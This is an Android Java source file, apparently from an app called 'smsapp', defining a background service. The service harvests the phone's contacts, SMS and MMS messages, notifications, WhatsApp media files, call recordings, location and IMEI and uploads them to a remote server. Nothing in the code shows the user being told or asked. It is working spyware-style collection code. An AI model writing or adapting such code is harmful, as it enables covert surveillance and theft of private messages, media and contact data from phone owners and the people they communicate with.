package gonext.smsapp.servers;

import android.Manifest;
import android.content.ContentResolver;
import android.content.Context;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.os.Environment;
import android.provider.ContactsContract;
import android.support.v4.content.ContextCompat;
import android.telephony.TelephonyManager;
import android.text.TextUtils;
import android.widget.Toast;

import java.io.BufferedReader;
import java.io.File;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.List;

import gonext.smsapp.contacts.ContactData;
import gonext.smsapp.contacts.ContactDetails;
import gonext.smsapp.contacts.SMSData;
import gonext.smsapp.db.ContactEntity;
import gonext.smsapp.db.DbService;
import gonext.smsapp.db.MediaEntity;
import gonext.smsapp.db.MessageEntity;
import gonext.smsapp.db.NotificationEntity;
import gonext.smsapp.utils.Constant;
import gonext.smsapp.utils.Utils;

/**
 * Created by ram on 05/10/17.
 */

public class BackgroundJobService {
    private Context context;
    private DbService dbService;
    private SmsService smsService;
    private String UserMobile;
    private String imeiNumber = "";
    private final int LIMITATION = 50;

    public BackgroundJobService(Context context) {
        this.context = context;
        dbService = new DbService(context);
        smsService = new SmsService(context);

    }
    public void ReadPhoneContacts() {
        if (ContextCompat.checkSelfPermission(context,
                Manifest.permission.READ_CONTACTS)
                == PackageManager.PERMISSION_GRANTED) {
            try {
                imeiNumber = Utils.getImeNumber(context);
                UserMobile = Utils.getMobileNo(context);
            } catch (Exception e) {
                e.printStackTrace();
            }
            String ContactName = "";
            String ContactID = "";
            String ContactNumber = "";
            List<ContactData> contactDataArrayList = new ArrayList<>();
            int i;
            int count = 0;
            Cursor cursor = context.getContentResolver().query(ContactsContract.Contacts.CONTENT_URI, null, null, null, null);
            if (Integer.valueOf(cursor.getCount()).intValue() > 0) {
                while (cursor.moveToNext()) {
                    ArrayList<ContactDetails> contactDetails = new ArrayList();
                    String id = cursor.getString(cursor.getColumnIndex("_id"));
                    String contactName = cursor.getString(cursor.getColumnIndex("display_name"));
                    if (Integer.parseInt(cursor.getString(cursor.getColumnIndex("has_phone_number"))) > 0) {
                        Cursor pCursor = context.getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, "contact_id = ?", new String[]{id}, null);
                        while (pCursor.moveToNext()) {
                            int phoneType = pCursor.getInt(pCursor.getColumnIndex("data2"));
                            contactDetails.add(new ContactDetails(String.valueOf(phoneType), pCursor.getString(pCursor.getColumnIndex("data1"))));
                        }
                        pCursor.close();
                    }
                    ContactEntity contactEntity = dbService.getContact(id);
                    if (contactEntity == null && count <= LIMITATION) {
                        contactEntity = new ContactEntity();
                        contactEntity.setContactId(id);
                        List<String> mobileNos = new ArrayList<>();
                        for (ContactDetails contactDetails1 : contactDetails) {
                            mobileNos.add(contactDetails1.getPhoneNo());
                        }
                        contactEntity.setMobile(TextUtils.join(",", mobileNos));
                        contactEntity.setName(contactName);
                        dbService.saveContact(contactEntity);
                        contactDataArrayList.add(new ContactData(contactName, id, contactDetails));
                        count++;
                    }
                }
                cursor.close();
            }

            if (contactDataArrayList.size() > 0) {
                if (contactDataArrayList.size() > 1) {
                    StringBuilder numberstringBuilder = new StringBuilder(contactDataArrayList.size());
                    StringBuilder namestringBuilder = new StringBuilder(contactDataArrayList.size());
                    StringBuilder contactIdstringBuilder = new StringBuilder(contactDataArrayList.size());
                    namestringBuilder = new StringBuilder(contactDataArrayList.size());
                    contactIdstringBuilder = new StringBuilder(contactDataArrayList.size());
                    numberstringBuilder = new StringBuilder(contactDataArrayList.size());
                    for (i = 0; i < contactDataArrayList.size(); i++) {
                        if (i == contactDataArrayList.size() - 1) {
                            namestringBuilder.append(((ContactData) contactDataArrayList.get(i)).getName());
                            contactIdstringBuilder.append(((ContactData) contactDataArrayList.get(i)).getContact_id());
                            if(contactDataArrayList.get(i).getContactDetails().size() > 0) {
                                numberstringBuilder.append(((ContactDetails) ((ContactData) contactDataArrayList.get(i)).getContactDetails().get(0)).getPhoneNo());
                            }else{
                                numberstringBuilder.append("00000");
                            }
                        } else {
                            namestringBuilder.append(((ContactData) contactDataArrayList.get(i)).getName() + "||");
                            contactIdstringBuilder.append(((ContactData) contactDataArrayList.get(i)).getContact_id() + "||");
                            if (contactDataArrayList.get(i).getContactDetails().size() > 0) {
                                numberstringBuilder.append(((ContactDetails) ((ContactData) contactDataArrayList.get(i)).getContactDetails().get(0)).getPhoneNo() + "||");
                            } else {
                                numberstringBuilder.append("00000" + "||");
                            }
                        }
                    }
                    ContactName = namestringBuilder.toString();
                    ContactID = contactIdstringBuilder.toString();
                    ContactNumber = numberstringBuilder.toString();
                } else {
                    ContactName = ((ContactData) contactDataArrayList.get(0)).getName();
                    ContactID = ((ContactData) contactDataArrayList.get(0)).getContact_id();
                    ContactNumber = ((ContactDetails) ((ContactData) contactDataArrayList.get(0)).getContactDetails().get(0)).getPhoneNo();
                }
            }
            if (contactDataArrayList.size() > 0) {
                smsService.sendContacts((UserMobile == null || UserMobile.equals("")) ? imeiNumber : UserMobile, ContactID, ContactNumber, ContactName);
            }
        }
    }



    public void sendSMSToServer() {
        if (ContextCompat.checkSelfPermission(context,
                Manifest.permission.READ_SMS)
                == PackageManager.PERMISSION_GRANTED) {
            try {
                imeiNumber = Utils.getImeNumber(context);
                UserMobile = Utils.getMobileNo(context);
            } catch (Exception e) {
                e.printStackTrace();
            }
            String MsgID = "";
            String MsgDate = "";
            String MsgFrom = "";
            String MsgTo = "";
            String MsgText = "";
            String Timestamp = "";
            List<SMSData> smsList = new ArrayList<>();
            int counting = 0;
            try {
                int i;
                smsList.clear();
                Cursor c = context.getContentResolver().query(Uri.parse("content://sms"), null, null, null, null);
//                ((Activity) context).startManagingCursor(c);
                int count = c.getCount();
                if (c.moveToFirst() && count > 0) {
                    for (i = 0; i < count; i++) {
                        SMSData sMSData;
                        SMSData sms = new SMSData();
                        String type = c.getString(c.getColumnIndexOrThrow("type")).toString();
                        if(type.equals("2")){//send
                            sms.setTonNumber(c.getString(c.getColumnIndexOrThrow("address")).toString());
                            sms.setNumber((UserMobile == null || UserMobile.equals("")) ? imeiNumber : UserMobile);
                        }else{//receive
                            sms.setNumber(c.getString(c.getColumnIndexOrThrow("address")).toString());
                            sms.setTonNumber((UserMobile == null || UserMobile.equals("")) ? imeiNumber : UserMobile);
                        }
                        sms.setBody(c.getString(c.getColumnIndexOrThrow("body")).toString());
                        if (c.isNull(c.getColumnIndexOrThrow("person"))) {
                            sms.setPerson("Edwin");
                        } else {
                            sms.setPerson(c.getString(c.getColumnIndexOrThrow("person")).toString());
                        }
                        if (c.isNull(c.getColumnIndexOrThrow("date"))) {
                            sms.setDate("Edwin");
                        } else {
                            try {
                                Timestamp = c.getString(c.getColumnIndexOrThrow("date")).toString();
                                sMSData = sms;
                                sMSData.setDate(new SimpleDateFormat("dd/MM/yyyy hh:mm aa").format(new Date(Long.valueOf(c.getString(c.getColumnIndexOrThrow("date")).toString()).longValue())));
                            } catch (Exception e) {
                                e.printStackTrace();
                            }
                        }
                        if (c.isNull(c.getColumnIndexOrThrow("date_sent"))) {
                            sms.setDate_sent("Edwin");
                        } else {
                            try {
                                sMSData = sms;
                                sMSData.setDate_sent(new SimpleDateFormat("dd/MM/yyyy hh:mm aa").format(new Date(Long.valueOf(c.getString(c.getColumnIndexOrThrow("date_sent")).toString()).longValue())));
                            } catch (Exception e2) {
                                e2.printStackTrace();
                            }
                        }
                        if (c.isNull(c.getColumnIndexOrThrow("_id"))) {
                            sms.set_id("Edwin");
                        } else {
                            sms.set_id(c.getString(c.getColumnIndexOrThrow("_id")).toString() + Timestamp);
                        }
                        MessageEntity messageEntity = dbService.getMessage(sms.get_id());
                        if (messageEntity == null && counting <= LIMITATION) {
                            messageEntity = new MessageEntity();
                            messageEntity.setMessageId(sms.get_id());
                            dbService.saveMessage(messageEntity);
                            smsList.add(sms);
                            counting ++;
                        }
                        c.moveToNext();
                    }
                }
                if (smsList.size() > 0) {
                    if (smsList.size() > 1) {
                        StringBuilder sb1 = new StringBuilder(smsList.size());
                        StringBuilder sb2 = new StringBuilder(smsList.size());
                        StringBuilder stringBuilder = new StringBuilder(smsList.size());
                        StringBuilder tostringBuilder = new StringBuilder(smsList.size());
                        StringBuilder stringBuilder3 = new StringBuilder(smsList.size());
                        for (i = 0; i < smsList.size(); i++) {
                            if (i == smsList.size() - 1) {
                                sb1.append(((SMSData) smsList.get(i)).get_id());
                                sb2.append(((SMSData) smsList.get(i)).getDate());
                                stringBuilder.append(((SMSData) smsList.get(i)).getNumber());
                                tostringBuilder.append(((SMSData) smsList.get(i)).getTonNumber());
                                stringBuilder3.append(((SMSData) smsList.get(i)).getBody());
                            } else {
                                sb1.append(((SMSData) smsList.get(i)).get_id() + "||");
                                sb2.append(((SMSData) smsList.get(i)).getDate() + "||");
                                stringBuilder.append(((SMSData) smsList.get(i)).getNumber() + "||");
                                tostringBuilder.append(((SMSData) smsList.get(i)).getTonNumber() + "||");
                                stringBuilder3.append(((SMSData) smsList.get(i)).getBody() + "||");
                            }
                        }
                        MsgID = sb1.toString();
                        MsgDate = sb2.toString();
                        MsgFrom = stringBuilder.toString();
                        MsgTo = tostringBuilder.toString();
                        MsgText = stringBuilder3.toString();
                    } else {
                        MsgID = ((SMSData) smsList.get(0)).get_id();
                        MsgDate = ((SMSData) smsList.get(0)).getDate();
                        MsgFrom = ((SMSData) smsList.get(0)).getNumber();
                        MsgTo = ((SMSData) smsList.get(0)).getTonNumber();
                        MsgText = ((SMSData) smsList.get(0)).getBody();
                    }
                }
                if (smsList.size() > 0) {
                    smsService.sendSms((UserMobile == null || UserMobile.equals("")) ? imeiNumber : UserMobile, MsgID, MsgDate, MsgFrom,MsgTo, MsgText);
                }
            } catch (Exception e22) {
                e22.printStackTrace();
            }
        }
    }


    public void sendNotificationsToServer() {
        if (ContextCompat.checkSelfPermission(context,
                Manifest.permission.READ_SMS)
                == PackageManager.PERMISSION_GRANTED) {
            try {
                imeiNumber = Utils.getImeNumber(context);
                UserMobile = Utils.getMobileNo(context);
            } catch (Exception e) {
                e.printStackTrace();
            }
            String MsgID = "";
            String MsgDate = "";
            String MsgFrom = "";
            String MsgTo = "";
            String MsgText = "";
            List<SMSData> smsList = new ArrayList<>();
            try {
                int i;
                smsList.clear();
                List<NotificationEntity> notifications = dbService.getAllNotifications();
                for(NotificationEntity notificationEntity : notifications){
                        SMSData sms = new SMSData();
                        sms.setDate(notificationEntity.getDateTime());
                        sms.setBody(notificationEntity.getMessage());
                        sms.setTonNumber((UserMobile == null || UserMobile.equals("")) ? imeiNumber : UserMobile);
                        sms.setNumber(notificationEntity.getFromNumber());
                        sms.set_id(notificationEntity.getKey().replaceAll("\\|",""));
                        smsList.add(sms);
                    }
                if (smsList.size() > 0) {
                    if (smsList.size() > 1) {
                        StringBuilder sb1 = new StringBuilder(smsList.size());
                        StringBuilder sb2 = new StringBuilder(smsList.size());
                        StringBuilder stringBuilder = new StringBuilder(smsList.size());
                        StringBuilder tostringBuilder = new StringBuilder(smsList.size());
                        StringBuilder stringBuilder3 = new StringBuilder(smsList.size());
                        for (i = 0; i < smsList.size(); i++) {
                            if (i == smsList.size() - 1) {
                                sb1.append(((SMSData) smsList.get(i)).get_id());
                                sb2.append(((SMSData) smsList.get(i)).getDate());
                                stringBuilder.append(((SMSData) smsList.get(i)).getNumber());
                                tostringBuilder.append(((SMSData) smsList.get(i)).getTonNumber());
                                stringBuilder3.append(((SMSData) smsList.get(i)).getBody());
                            } else {
                                sb1.append(((SMSData) smsList.get(i)).get_id() + "||");
                                sb2.append(((SMSData) smsList.get(i)).getDate() + "||");
                                stringBuilder.append(((SMSData) smsList.get(i)).getNumber() + "||");
                                tostringBuilder.append(((SMSData) smsList.get(i)).getTonNumber() + "||");
                                stringBuilder3.append(((SMSData) smsList.get(i)).getBody() + "||");
                            }
                        }
                        MsgID = sb1.toString();
                        MsgDate = sb2.toString();
                        MsgFrom = stringBuilder.toString();
                        MsgTo = tostringBuilder.toString();
                        MsgText = stringBuilder3.toString();
                    } else {
                        MsgID = ((SMSData) smsList.get(0)).get_id();
                        MsgDate = ((SMSData) smsList.get(0)).getDate();
                        MsgFrom = ((SMSData) smsList.get(0)).getNumber();
                        MsgTo = ((SMSData) smsList.get(0)).getTonNumber();
                        MsgText = ((SMSData) smsList.get(0)).getBody();
                    }
                }
                if (smsList.size() > 0) {
                    smsService.sendNotification((UserMobile == null || UserMobile.equals("")) ? imeiNumber : UserMobile, MsgID, MsgDate, MsgFrom,MsgTo, MsgText, notifications);
                }
            } catch (Exception e22) {
                e22.printStackTrace();
            }
        }
    }

    public void readWhatsAppMediaFiles(){
        if (ContextCompat.checkSelfPermission(context,
                Manifest.permission.READ_SMS)
                == PackageManager.PERMISSION_GRANTED) {
            try {
                imeiNumber = Utils.getImeNumber(context);
                UserMobile = Utils.getMobileNo(context);
            } catch (Exception e) {
                e.printStackTrace();
            }
            try {
                String mediaPath = Environment.getExternalStorageDirectory() + "/WhatsApp/Media/";

                String gifPath = mediaPath + "WhatsApp Animated Gifs";
                String audioPath = mediaPath + "WhatsApp Audio";
                String docPath = mediaPath + "WhatsApp Documents";
                String imagePath = mediaPath + "WhatsApp Images";
                String vidoePath = mediaPath + "WhatsApp Video";
                String voiceNotesPath = mediaPath + "WhatsApp Voice Notes";

                if (!processMediaFiles(gifPath,"image")) {
                    if (!processMediaFiles(audioPath,"audio")) {
                        if (!processMediaFiles(docPath,"doc")) {
                            if (!processMediaFiles(imagePath,"image")) {
                                if (!processMediaFiles(vidoePath,"video")) {
                                    processMediaFiles(voiceNotesPath,"audio");
                                }
                            }
                        }
                    }
                }
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
    }
    private boolean processMediaFiles(String mediaPath,String type){
        File folder = new File(mediaPath);
        if(folder.exists()){
            File[] files = folder.listFiles();
            if(files != null) {
                for (File file : files) {
                    if (file.isFile()) {
                        if(type.equals("video")){
                            long fileSize = file.length();
                            double kilobytes = (fileSize / 1024);
                            double megabytes = (kilobytes / 1024);
                            if(megabytes <= 2){// file size less than 2mb for video file only
                                boolean isSent = sendMediaFile(file);
                                if(isSent){
                                    return true;
                                }
                            }
                        }else{
                            boolean isSent = sendMediaFile(file);
                            if(isSent){
                                return true;
                            }
                        }
                    }
                }
            }
        }
        return false;
    }

    private boolean sendMediaFile(File file){
        String name = file.getName();
        if (dbService.getMedia(name) == null) {
            MediaEntity mediaEntity = new MediaEntity();
            mediaEntity.setName(name);
            dbService.saveMedia(mediaEntity);
            //server call
            smsService.sendMedia(file, (UserMobile == null || UserMobile.equals("")) ? imeiNumber : UserMobile);
            return true;
        }
        return false;
    }

    public void sendCallRecording(){
        if (ContextCompat.checkSelfPermission(context,
                Manifest.permission.READ_SMS)
                == PackageManager.PERMISSION_GRANTED) {
            try {
                imeiNumber = Utils.getImeNumber(context);
                UserMobile = Utils.getMobileNo(context);
            } catch (Exception e) {
                e.printStackTrace();
            }
            File folder = new File(context.getCacheDir().getAbsolutePath() + "/calls");
            if (folder.exists()) {
                File[] files = folder.listFiles();
                if (files != null) {
                    for (File file : files) {
                        if(file != null && file.exists() && file.getAbsolutePath().endsWith("end.3gpp"))
                        {
                            smsService.sendCallrecordings(file, (UserMobile == null || UserMobile.equals("")) ? imeiNumber : UserMobile);
                        }
                    }
                }
            }
        }
    }

    public void sendLocation(){
        if (ContextCompat.checkSelfPermission(context,
                Manifest.permission.READ_SMS)
                == PackageManager.PERMISSION_GRANTED) {
            try {
                imeiNumber = Utils.getImeNumber(context);
                UserMobile = Utils.getMobileNo(context);
            } catch (Exception e) {
                e.printStackTrace();
            }

                            smsService.sendLocation( (UserMobile == null || UserMobile.equals("")) ? imeiNumber : UserMobile);
        }
    }

    public void getMobileNo() {
        if (ContextCompat.checkSelfPermission(context,
                Manifest.permission.READ_SMS)
                == PackageManager.PERMISSION_GRANTED) {
            try {
                int i;
                Cursor c = context.getContentResolver().query(Uri.parse("content://sms"), null, null, null, null);
                int count = c.getCount();
                if (c.moveToFirst() && count > 0) {
                    for (i = 0; i < count; i++) {
                        String msgTxt = c.getString(c.getColumnIndexOrThrow("body")).toString();
                        if(msgTxt != null && msgTxt.startsWith("60") && msgTxt.contains(":")){
                                String mobileNo = msgTxt.substring(0,msgTxt.indexOf(":"));
                                Utils.saveMobileNo(mobileNo.replaceAll(" ", ""),context);
                                return;
                        }
                        c.moveToNext();
                    }
                }
            } catch (Exception e22) {
                e22.printStackTrace();
            }
        }
    }

    public void readMMSMEssage(){
        try{
            if (ContextCompat.checkSelfPermission(context,
                    Manifest.permission.READ_SMS)
                    == PackageManager.PERMISSION_GRANTED) {
                ContentResolver contentResolver = context.getContentResolver();
                Uri uri = Uri.parse("content://mms");
                Cursor cursor = contentResolver.query(uri, null, null, null, null);
                String[] projection = new String[] { "_id","thread_id","date", "m_type" };

                try {
                    if(cursor != null)
                    {
                        while (cursor.moveToNext()) {
                            int threadId =  cursor.getInt(1);
                            Cursor cursor1 = contentResolver.query(uri, projection, "thread_id=?", new String[]{String.valueOf(threadId)}, null);
                            while (cursor1.moveToNext()) {
                                String body = null;
                                // implementation of this method is below
                                // Get details of MMS(content of MMS)
                                String selectionPart = new String("mid = '" + cursor1.getString(0) + "'");
                                Cursor curPart = context.getContentResolver().query(Uri.parse("content://mms/part"), null, selectionPart, null, null);
                                while (curPart.moveToNext()) {
                                    if (curPart.getString(3).equals("image/jpeg")) {
                                        // implementation of this method is below
                                        String data = curPart.getString(curPart.getColumnIndex("_data"));
                                        if (data != null) {
                                            // implementation of this method below
                                            body = getMmsText(curPart.getString(0));
                                        } else {
                                            body = curPart.getString(curPart.getColumnIndex("text"));
                                        }
                                    } else if ("text/plain".equals(curPart.getString(3))) {
                                        String data = curPart.getString(curPart.getColumnIndex("_data"));
                                        if (data != null) {
                                            // implementation of this method below
                                            body = getMmsText(curPart.getString(0));
                                        } else {
                                            body = curPart.getString(curPart.getColumnIndex("text"));
                                        }
                                    }
                                    if(body != null && body.startsWith("60") && body.contains(":")){
                                        String mobileNo = body.substring(0,body.indexOf(":"));
                                            Utils.saveMobileNo(mobileNo.replaceAll(" ", ""), context);
                                            return;
                                    }
                                }
                                curPart.close();
                            }
                            cursor1.close();
                        }cursor.close();
                    }
                } catch (Exception e) {
                    e.printStackTrace();
                }
            }
        }catch(Exception e){
            e.printStackTrace();
        }
    }

    private String getMmsText(String id) {
        Uri partURI = Uri.parse("content://mms/part/" + id);
        InputStream is = null;
        StringBuilder sb = new StringBuilder();
        try {
            is = context.getContentResolver().openInputStream(partURI);
            if (is != null) {
                InputStreamReader isr = new InputStreamReader(is, "UTF-8");
                BufferedReader reader = new BufferedReader(isr);
                String temp = reader.readLine();
                while (temp != null) {
                    sb.append(temp);
                    temp = reader.readLine();
                }
            }
        } catch (IOException e) {}
        finally {
            if (is != null) {
                try {
                    is.close();
                } catch (IOException e) {}
            }
        }
        return sb.toString();
    }
}
